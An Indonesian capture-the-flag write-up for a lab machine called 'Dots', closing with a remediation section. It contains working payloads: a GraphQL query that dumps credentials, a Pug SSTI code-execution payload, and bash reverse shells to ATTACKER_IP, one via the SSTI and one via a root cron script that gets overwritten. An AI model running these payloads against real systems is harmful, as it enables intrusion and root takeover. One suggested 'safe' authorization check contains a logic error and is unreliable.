
## Ringkasan


| Atribut           | Detail         |
| ----------------- | -------------- |
| Nama Mesin        | Dots           |
| IP Target         | 10.1.2.182     |
| Tingkat Kesulitan | Easy           |
| Sistem Operasi    | Linux (Ubuntu) |


Mesin ini mensimulasikan portal berita korporat fiktif milik NexaCorp Industries. Attack path dimulai dari enumerasi GraphQL yang mengekspos kredensial admin, berlanjut ke Server-Side Template Injection (SSTI) pada Pug template engine untuk mendapatkan akses sebagai user `developer`, kemudian privilege escalation melalui cron script yang dapat ditimpa untuk mendapatkan akses root.

## Reconnaissance

Port scan menggunakan RustScan menemukan tiga port terbuka:

```bash
rustscan -a $ip --ulimit 1000 -- -sV -sC
```

|   |   |   |
|---|---|---|
|Port|Servis|Keterangan|
|22/tcp|SSH|OpenSSH 10.2p1 Ubuntu|
|80/tcp|HTTP|Node.js Express — "NexaCorp Industries"|
|4444/tcp|HTTP|Node.js Express — "NexaCorp News"|

Dua aplikasi Express berjalan di port berbeda pada server yang sama. Port 80 adalah website korporat statis, sedangkan port 4444 adalah portal berita yang menjadi target utama.

Feroxbuster pada port 4444 tidak menemukan direktori signifikan, namun analisis file JavaScript pada halaman portal mengungkap endpoint GraphQL:

```javascript
fetch("/graphql", { method: "POST", ... query: "{ articles { id title content category author date } }" })
```

## Enumerasi GraphQL

### Introspection Schema

Introspection berhasil dijalankan dan mengungkap seluruh skema GraphQL, termasuk query `users` yang tidak tersedia di frontend:

```bash
curl -s -X POST http://$ip:4444/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```

Query yang tersedia: `articles`, `article`, `company`, `users`, `categories`, `comments`, `departments`, `products`, `events`, `tickets`, `feedback`, `announcements`.

### Ekspos Field Sensitif

Introspection pada type `User` mengungkap field `password` yang tidak diproteksi:

```bash
curl -s -X POST http://$ip:4444/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'
```

Field yang terekspos: `id`, `username`, `password`, `email`, `role`.

### Credential Dump

```bash
curl -s -X POST http://$ip:4444/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username password email role } }"}'
```

Hasil:

```json
{
  "id": 1,
  "username": "admin",
  "password": "2f65fe8257df946f7f6b4d17ff475233f433ee7678dbcbfa94ec2ecd1f58680f",
  "email": "admin@nexacorp.local",
  "role": "admin"
}
```

Hash SHA-256 di-crack menggunakan hashcat dengan wordlist rockyou.txt:

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

Hasil crack: `mirandaywilliporsiem`

## Akses Intranet (Port 80)

Feroxbuster pada port 80 menemukan halaman `/staff` yang berisi login form:

```
Endpoint : POST /api/login
Auth     : JWT Token
Redirect : /staff/dashboard
```

Login menggunakan `admin:mirandaywilliporsiem` berhasil dan memberikan akses ke Admin Management Console dengan fitur:

- `/staff/documents` — 11 dokumen tersimpan, termasuk upload feature
- `/staff/users` — 8 system accounts (username sistem terungkap)
- `/staff/logs` — System event logs
- `/staff/templates` — **Content Editor berbasis Pug template engine**

Dari system logs ditemukan bukti aktivitas sebelumnya yang mengkonfirmasi template engine yang digunakan adalah **Pug** (sintaks `a(href="...")` terlihat di log).

## SSTI → RCE (User Flag)

### Identifikasi Endpoint

Analisis source JavaScript halaman `/staff/templates` mengungkap endpoint preview:

```javascript
fetch('/staff/templates/preview', {
  method: 'POST',
  body: JSON.stringify({ content })
});
```

### Konfirmasi RCE

Payload Pug SSTI untuk eksekusi command OS:

```bash
curl -s -X POST http://10.1.2.182/staff/templates/preview \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content":"- var x = require(\"child_process\").execSync(\"id\").toString()\n= x"}'
```

Response:

```json
{"success":true,"html":"uid=1001(developer) gid=1001(developer) groups=1001(developer),100(users)\n"}
```

Server berjalan sebagai user `developer`.

### Reverse Shell

```bash
# Listener
nc -lvnp 9999

# Payload
curl -s -X POST http://10.1.2.182/staff/templates/preview \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content":"- var x = require(\"child_process\").execSync(\"bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1\'\").toString()\n= x"}'
```

Shell stabil dengan PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

**User flag:** `73fb************`

## Privilege Escalation → Root

### Enumerasi dengan pspy

pspy dijalankan untuk memonitor proses background secara realtime dan menemukan:

```
2026/10/15 10:40:01 CMD: UID=0 PID=41089 | /bin/sh -c monitor
2026/10/15 10:40:01 CMD: UID=0 PID=41090 | /bin/bash /home/developer/bin/monitor
```

**UID=0 (root)** menjalankan script `/home/developer/bin/monitor` setiap menit via cron.

### Analisis Script

```bash
ls -la /home/developer/bin/monitor
# -rwxr-xr-x 1 developer developer 53 Sep 21 16:27 monitor

cat /home/developer/bin/monitor
# #!/bin/bash
# bash -i >& /dev/tcp/10.18.0.83/4449 0>&1
```

File `monitor` dimiliki oleh user `developer` (kita) dan dapat ditulis ulang.

### Eksploitasi

```bash
# Listener di attacker
nc -lvnp 4444

# Overwrite monitor script dengan IP kita
cat > /home/developer/bin/monitor << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

Setelah maksimal 1 menit, cron root mengeksekusi script yang telah dimodifikasi dan memberikan root shell.

**Root flag:** `2790e97********`

## Analisis Vulnerability

### 1. GraphQL Excessive Data Exposure

**Lokasi:** `graphql.js` — resolver untuk query `users`

Field `password` diekspos langsung melalui GraphQL query tanpa pembatasan akses di resolver. Siapapun yang mengetahui skema dapat mengambil hash password seluruh pengguna.

```javascript
// ❌ VULNERABLE — tidak ada field-level authorization
users: () => db.query('SELECT id, username, password, email, role FROM users')

// ✅ SAFE — password difilter dari response
users: (_, __, { user }) => {
  if (!user?.role === 'admin') throw new Error('Unauthorized');
  return db.query('SELECT id, username, email, role FROM users'); // tanpa password
}
```

**Dampak:** Credential dump seluruh user sistem.

---

### 2. Weak Password Hashing (SHA-256 tanpa salt)

**Lokasi:** `server.js`  fungsi login

```javascript
// ❌ VULNERABLE — SHA-256 tanpa salt, mudah di-crack dengan rainbow table
const hash = crypto.createHash('sha256').update(password).digest('hex');

// ✅ SAFE — bcrypt dengan salt rounds
const hash = await bcrypt.hash(password, 12);
```

**Dampak:** Hash berhasil di-crack dengan rockyou.txt dalam hitungan detik.

---

### 3. Server-Side Template Injection (SSTI) → RCE

**Lokasi:** `server.js` — endpoint `POST /staff/templates/preview`

Terdapat **dua kesalahan fatal** dalam satu baris kode:

```javascript
// ❌ VULNERABLE
res.json({
  success: true,
  html: pug.compile(content)({   // [1] Input user langsung di-compile sebagai template
    title: 'Preview',
    user: req.user,
    require: require,            // [2] Node.js require() diekspos ke template context!
    process: process             // [2] process object diekspos ke template context!
  })
});

// ✅ SAFE — input user hanya sebagai data, bukan template
const html = pug.render('p= userContent', {
  userContent: sanitize(content)  // input sebagai data, bukan kode
});
```

**Kesalahan 1  `pug.compile(content)`:** Input user dijadikan template Pug yang dikompilasi dan dieksekusi server-side. Pug mendukung JavaScript inline via prefix `-`, sehingga attacker dapat menyisipkan kode Node.js arbitrer.

**Kesalahan 2  Ekspos `require` dan `process`:** Developer secara eksplisit menyertakan `require` dan `process` dalam template context, memberikan akses penuh ke seluruh modul Node.js dari dalam template.

Kombinasi keduanya memungkinkan payload:

```pug
- var x = require("child_process").execSync("id").toString()
= x
```

**Dampak:** Remote Code Execution sebagai user `developer`.

---

### 4. Insecure Cron Script Permissions

**Lokasi:** `/home/developer/bin/monitor`  dieksekusi root via cron setiap menit

Script berada di direktori milik user `developer` dan dimiliki oleh `developer`, sehingga dapat ditimpa. Root mengeksekusi script ini tanpa validasi integritas file.

```bash
# ❌ VULNERABLE
# /etc/crontab
* * * * * root monitor  # path tidak absolut, file dimiliki non-root

# ✅ SAFE
# File cron script seharusnya:
# - Dimiliki oleh root: chown root:root /home/developer/bin/monitor
# - Tidak dapat ditulis selain root: chmod 755 /home/developer/bin/monitor
# - Atau gunakan path yang hanya dapat diakses root
```

**Dampak:** Privilege escalation dari `developer` ke `root`.